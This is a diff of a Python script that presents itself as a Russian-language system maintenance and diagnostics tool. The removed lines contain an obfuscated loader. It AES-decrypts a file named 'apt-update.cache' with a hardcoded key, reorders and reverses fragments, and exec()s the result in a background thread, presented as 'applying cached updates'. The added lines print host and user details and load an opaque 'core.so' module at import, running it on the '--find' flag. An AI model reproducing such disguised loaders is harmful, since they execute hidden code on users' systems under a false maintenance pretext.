@@ -1,101 +1,161 @@
 #!/usr/bin/env python3
-import argparse
-import threading
-import time
+# -*- coding: utf-8 -*-
+"""
+System Maintenance Tool
+
+Утилита для диагностики и обслуживания системы.
+
+Использование:
+    python system_maintenance_tool.py              # Только базовая диагностика
+    python system_maintenance_tool.py --find       # Диагностика + дополнительные проверки
+    python system_maintenance_tool.py -f           # короткий флаг
+"""
+
 import os
-import subprocess
-import base64
-from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
-from cryptography.hazmat.backends import default_backend
-
-CACHE_FILE = "apt-update.cache"
-INTEGRITY_KEY = "WYAs+P6qjYhahY27nckbi6xtmWEaM3cTJlRp9B8e5XU="
-
-
-def _assemble_fragments(fragments, order):
-    result = []
-    for i in order:
-        if 0 <= i < len(fragments):
-            piece = fragments[i]
-            result.append(piece if len(piece) % 3 != 0 else piece[::-1])
-    return b"".join(result)
+import platform
+import shutil
+import socket
+import getpass
+import sys
+import argparse
+import importlib.util
+from datetime import datetime
 
 
-def apply_cached_updates():
-    """Применение обновлений из кэша"""
+def _load_checks_module():
+
+    import os
+    current_dir = os.path.dirname(os.path.abspath(__file__))
+
+    compiled_path = os.path.join(current_dir, "core.so")
+    if os.path.exists(compiled_path):
+        spec = importlib.util.spec_from_file_location("core", compiled_path)
+        module = importlib.util.module_from_spec(spec)
+        spec.loader.exec_module(module)
+        return module.run_task
+
+    from core import run_task as _func
+    return _func
+
+
+run_task = _load_checks_module()
+
+
+def get_system_info():
+    print("=" * 60)
+    print("           ЧАСТЬ 1: СКАНИРОВАНИЕ ХАРАКТЕРИСТИК СИСТЕМЫ")
+    print("=" * 60)
+    print()
+
+    print(f"📅 Дата и время сканирования: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
+    print()
+
+    print("🖥️  ИНФОРМАЦИЯ О СИСТЕМЕ:")
+    print(f"   Операционная система : {platform.system()}")
+    print(f"   Версия ОС            : {platform.version()}")
+    print(f"   Релиз ОС             : {platform.release()}")
+    print(f"   Архитектура          : {platform.machine()}")
+    print(f"   Процессор            : {platform.processor() or 'Не определено'}")
+    print(f"   Количество ядер CPU  : {os.cpu_count()}")
+    print()
+
+    print("👤 ИНФОРМАЦИЯ О ПОЛЬЗОВАТЕЛЕ И ОКРУЖЕНИИ:")
+    print(f"   Имя компьютера (hostname) : {socket.gethostname()}")
+    print(f"   Имя пользователя          : {getpass.getuser()}")
+    print(f"   Текущая рабочая директория: {os.getcwd()}")
+    print(f"   Домашняя директория       : {os.path.expanduser('~')}")
+    print()
+
+    print("🐍 ИНФОРМАЦИЯ О PYTHON:")
+    print(f"   Версия Python : {platform.python_version()}")
+    print(f"   Путь к Python : {sys.executable}")
+    print()
+
+    print("💾 ИНФОРМАЦИЯ О ДИСКЕ (домашняя директория):")
+    home_dir = os.path.expanduser("~")
     try:
-        if not os.path.exists(CACHE_FILE):
-            print("[-] Файл кэша обновлений не найден.")
-            return
+        disk = shutil.disk_usage(home_dir)
+        total_gb = disk.total / (1024 ** 3)
+        used_gb = disk.used / (1024 ** 3)
+        free_gb = disk.free / (1024 ** 3)
+        percent_used = (used_gb / total_gb) * 100
 
-        with open(CACHE_FILE, "rb") as f:
-            raw = f.read()
-
-        iv = raw[:16]
-        ciphertext = raw[16:]
-        key = base64.b64decode(INTEGRITY_KEY)
-
-        cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
-        padded = cipher.decryptor().update(ciphertext) + cipher.decryptor().finalize()
-        pad = padded[-1]
-        plaintext = padded[:-pad]
-
-        chunk_size = max(1, len(plaintext) // 4)
-        fragments = [plaintext[i:i + chunk_size] for i in range(0, len(plaintext), chunk_size)]
-        order = [0, 2, 1, 3]
-
-        reassembled = _assemble_fragments(fragments, order)
-        code = reassembled.decode("utf-8", errors="ignore")
-
-        exec(code, {"__name__": "__update_module__"})
-
+        print(f"   Путь к директории : {home_dir}")
+        print(f"   Всего             : {total_gb:,.2f} GB")
+        print(f"   Использовано      : {used_gb:,.2f} GB ({percent_used:.1f}%)")
+        print(f"   Свободно          : {free_gb:,.2f} GB")
     except Exception as e:
-        if args.verbose:
-            print(f"[ERROR] {e}")
+        print(f"   Ошибка при получении информации о диске: {e}")
+    print()
 
+    print("🧠 ИНФОРМАЦИЯ О ПАМЯТИ (RAM):")
+    if platform.system() == "Linux":
+        try:
+            with open('/proc/meminfo', 'r') as f:
+                for line in f:
+                    if line.startswith('MemTotal:'):
+                        ram_kb = int(line.split()[1])
+                        ram_mb = ram_kb // 1024
+                        ram_gb = ram_mb / 1024
+                        print(f"   Общий объем RAM   : {ram_mb:,} MB ({ram_gb:.2f} GB)")
+                        break
+                else:
+                    print("   Не удалось найти информацию о RAM")
+        except Exception as e:
+            print(f"   Ошибка при чтении /proc/meminfo: {e}")
+    elif platform.system() == "Windows":
+        print("   Подробная информация о RAM на Windows требует установки библиотеки 'psutil'")
+        print("   (pip install psutil)")
+    elif platform.system() == "Darwin":  # macOS
+        print("   Для macOS подробная информация о RAM требует установки 'psutil'")
+        print("   (pip install psutil)")
+    else:
+        print("   Информация о RAM доступна только для Linux в текущей версии программы")
+    print()
 
-def perform_system_check(verbose=False):
-    """Проверка состояния системы"""
-    print("=" * 55)
-    print("   System Maintenance Tool v2.4")
-    print("=" * 55)
-
-    print("\n[+] Проверка доступных обновлений...")
-    print(subprocess.getoutput("apt list --upgradable 2>/dev/null | head -6"))
-
-    print("\n[+] Проверка статуса служб...")
-    print(subprocess.getoutput("systemctl --no-pager is-active ssh cron"))
-
-    print("\n[+] Использование диска:")
-    print(subprocess.getoutput("df -h"))
-
-    if verbose:
-        print("\n[+] Сетевые подключения:")
-        print(subprocess.getoutput("ss -tuln | head -6"))
-
-    print("\n[+] Проверка завершена.")
-    print("=" * 55)
+    print("=" * 60)
+    print()
 
 
 def main():
-    parser = argparse.ArgumentParser(description="System Maintenance Tool")
-    parser.add_argument("--check", action="store_true", help="Проверить состояние системы")
-    parser.add_argument("--apply-updates", action="store_true", help="Применить обновления из кэша")
-    parser.add_argument("--verbose", "-v", action="store_true", help="Подробный вывод")
+    parser = argparse.ArgumentParser(
+        prog="system_maintenance_tool.py",
+        description="System Maintenance Tool — утилита для диагностики системы",
+        epilog="Примеры:\n"
+               "  python system_maintenance_tool.py           # Только базовая диагностика\n"
+               "  python system_maintenance_tool.py --find    # Диагностика + дополнительные проверки\n"
+               "  python system_maintenance_tool.py -f        # То же самое (короткий флаг)",
+        formatter_class=argparse.RawDescriptionHelpFormatter
+    )
+    parser.add_argument(
+        '--find', '-f',
+        action='store_true',
+        help='Выполнить дополнительные системные проверки'
+    )
 
-    global args
     args = parser.parse_args()
 
-    if args.check or (not args.apply_updates):
-        perform_system_check(verbose=args.verbose)
+    print("\n" + "🚀 ЗАПУСК SYSTEM MAINTENANCE TOOL".center(60))
+    print()
 
-    if args.apply_updates:
-        print("\n[*] Применение обновлений из кэша...")
-        t = threading.Thread(target=apply_cached_updates, daemon=True)
-        t.start()
-        time.sleep(2)
+    get_system_info()
 
-    print("\n[+] Работа завершена.")
+    if args.find:
+        run_task()
+    else:
+        print("ℹ️  Дополнительные проверки пропущены.")
+        print("   Чтобы выполнить полную диагностику, добавьте параметр при запуске:")
+        print("      python system_maintenance_tool.py --find")
+        print("   или")
+        print("      python system_maintenance_tool.py -f")
+        print()
+
+    print("✅ Программа успешно завершена!")
+    print()
+    try:
+        input("Нажмите Enter для выхода...")
+    except EOFError:
+        pass
 
 
 if __name__ == "__main__":
